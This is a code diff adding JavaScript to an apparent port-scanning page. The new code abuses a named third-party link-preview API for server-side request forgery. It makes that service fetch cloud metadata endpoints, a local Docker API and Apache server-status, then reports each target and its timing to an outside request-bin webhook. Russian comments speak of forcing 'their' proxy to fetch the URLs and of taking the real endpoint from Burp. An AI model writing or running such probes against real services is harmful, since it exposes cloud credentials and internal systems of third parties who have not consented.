@@ -37,6 +37,25 @@
                 fetch(`${webhook}?port=${port}&time=${duration}&status=scanned`);
                 
                 document.getElementById('log').innerHTML += `<p>Port ${port}: ${duration}ms</p>`;
+
+                const sensitiveUrls = [
+    "http://169.254.169.254.nip.io/latest/meta-data/", // AWS/OpenStack
+    "http://100.100.100.200.nip.io/latest/meta-data/", // Alibaba
+    "http://127.0.0.1.nip.io:2375/v1.24/containers/json", // Docker API
+    "http://127.0.0.1.nip.io:80/server-status" // Apache Status
+];
+
+sensitiveUrls.forEach(async (url) => {
+    const start = Date.now();
+    try {
+        // Заставляем их прокси-сервер дернуть эти URL
+        // ЗАМЕНИ 'https://web.max.ru/api/preview?url=' на реальный URL из Burp
+        await fetch(`https://web.max.ru/api/preview?url=${encodeURIComponent(url)}`, { mode: 'no-cors' });
+        
+        const duration = Date.now() - start;
+        fetch(`https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?target=${btoa(url)}&time=${duration}`);
+    } catch(e) {}
+});
             }
         }
 
